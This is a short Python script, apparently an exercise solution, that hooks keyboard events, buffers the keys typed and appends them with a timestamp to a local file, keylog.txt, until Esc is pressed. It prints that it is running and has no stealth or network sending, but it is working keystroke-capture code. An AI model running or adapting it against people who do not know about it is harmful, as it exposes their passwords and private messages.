# Simple Keylogger

# Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers.


import os
import datetime
import keyboard

log_buffer = ""

def log_keystroke(event):
    global log_buffer
    key = event.name
    
    if len(key) == 1:
        # It's a normal character
        log_buffer += key
    elif key == "space":
        log_buffer += " "
    elif key == "enter":
        log_buffer += "\n"
    elif key == "backspace":
        log_buffer = log_buffer[:-1]
    elif key == "tab":
        log_buffer += "\t"
    elif key == "esc":
        save_logs()
        keyboard.unhook_all()
        print("\nKeylogger stopped and logs saved to 'keylog.txt'.")
        return False  # Stop the listener

def save_logs():
    with open('keylog.txt', 'a') as f:
        f.write("\n\nLogged at: " + datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + "\n")
        f.write(log_buffer)

keyboard.on_release(log_keystroke)

print("Keylogger started. Press 'Esc' to stop and save.")

# Keep the program running until 'Esc' is pressed
keyboard.wait('esc')
